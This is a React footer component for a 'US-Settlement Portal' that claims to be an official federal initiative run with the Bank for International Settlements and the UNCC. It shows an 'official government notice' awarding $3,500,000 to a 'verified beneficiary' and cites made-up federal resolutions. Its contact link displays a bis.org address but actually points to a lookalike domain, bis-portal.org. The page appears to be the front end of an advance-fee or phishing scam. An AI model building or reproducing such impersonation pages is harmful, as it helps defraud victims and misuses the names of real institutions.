import React from 'react';
import { Landmark, Mail, Lock, ShieldAlert, Star } from 'lucide-react';

interface FooterProps {
  onOpenFAQ?: () => void;
}

const Footer: React.FC<FooterProps> = ({ onOpenFAQ }) => {
  return (
    <footer className="bg-white border-t-8 border-[#002868] pt-16 pb-8">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="grid grid-cols-1 md:grid-cols-4 gap-12 mb-16">
          <div className="md:col-span-2 space-y-6">
            <div className="flex items-center gap-4">
              <div className="p-2 bg-[#002868] rounded">
                <Landmark className="w-8 h-8 text-white" />
              </div>
              <div className="flex flex-col">
                <span className="text-xl font-black text-slate-900 tracking-tighter uppercase">US-Settlement Portal</span>
                <span className="text-[10px] text-[#BF0A30] font-black tracking-[0.4em] uppercase">Federal Initiative 2025</span>
              </div>
            </div>
            <p className="text-slate-600 text-sm font-medium leading-relaxed max-w-md">
              The official portal for the United States Department of Settlement in collaboration with 
              the Bank for International Settlement (BIS) and the UNCC compensation committee.
            </p>
            <div className="flex gap-4">
              <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" className="h-6 w-10 shadow-sm opacity-50" alt="Flag" />
              <div className="flex gap-1">
                {[...Array(5)].map((_, i) => <Star key={i} className="w-3 h-3 text-slate-200 fill-slate-200" />)}
              </div>
            </div>
          </div>

          <div>
            <h4 className="text-xs font-black text-slate-900 mb-6 uppercase tracking-widest border-b-2 border-[#BF0A30] pb-2 w-fit">
              Legal Compliance
            </h4>
            <ul className="space-y-3 text-[11px] font-bold text-slate-500 uppercase tracking-tighter">
              <li className="hover:text-[#002868] cursor-pointer">Federal Resolution 2025-A</li>
              <li className="hover:text-[#002868] cursor-pointer">BIS File /CPM/025</li>
              <li className="hover:text-[#002868] cursor-pointer">Asset Recovery Mandate</li>
              <li onClick={onOpenFAQ} className="hover:text-[#002868] cursor-pointer text-[#BF0A30]">Official FAQ & Help</li>
            </ul>
          </div>

          <div>
            <h4 className="text-xs font-black text-slate-900 mb-6 uppercase tracking-widest border-b-2 border-[#BF0A30] pb-2 w-fit">
              Official Channels
            </h4>
            <p className="text-[11px] text-slate-500 font-bold uppercase mb-4">
              Committee on Payment and Market Infrastructures (CPMI)
            </p>
            <a href="mailto:settlement@bis-portal.org" className="text-[#002868] text-sm font-black hover:underline uppercase tracking-tighter">
              cpmi-settlement@bis.org
            </a>
          </div>
        </div>

        <div className="pt-8 border-t border-slate-100 text-center">
          <div className="bg-[#f0f0f0] border-2 border-slate-200 p-8 mb-10 max-w-5xl mx-auto text-left relative overflow-hidden">
            <div className="absolute top-0 right-0 p-4 opacity-5">
              <ShieldAlert className="w-32 h-32" />
            </div>
            <p className="text-[10px] text-slate-800 font-black leading-relaxed uppercase tracking-tighter mb-4">
              OFFICIAL GOVERNMENT NOTICE:
            </p>
            <p className="text-[11px] text-slate-600 font-bold leading-relaxed italic">
              "Under the 2025 Federal Directive, the allocation of $3,500,000.00 is designated to the verified beneficiary associated with the authorized session. 
              The Bank for International Settlement (BIS) ensures that all funds are non-transferable and subject to strict federal audit. 
              Any attempt to falsify claim documents is a federal offense."
            </p>
          </div>
          <div className="flex flex-col md:flex-row justify-between items-center gap-4">
            <p className="text-slate-400 text-[9px] font-bold tracking-[0.3em] uppercase">
              © {new Date().getFullYear()} US-SETTLEMENT • BIS • UNCC PARTNERSHIP
            </p>
            <div className="flex gap-6 opacity-40">
              <span className="text-[9px] font-black uppercase tracking-widest cursor-pointer">Privacy Policy</span>
              <span className="text-[9px] font-black uppercase tracking-widest cursor-pointer">Accessibility</span>
              <span className="text-[9px] font-black uppercase tracking-widest cursor-pointer">FOIA</span>
            </div>
          </div>
        </div>
      </div>
    </footer>
  );
};

export default Footer;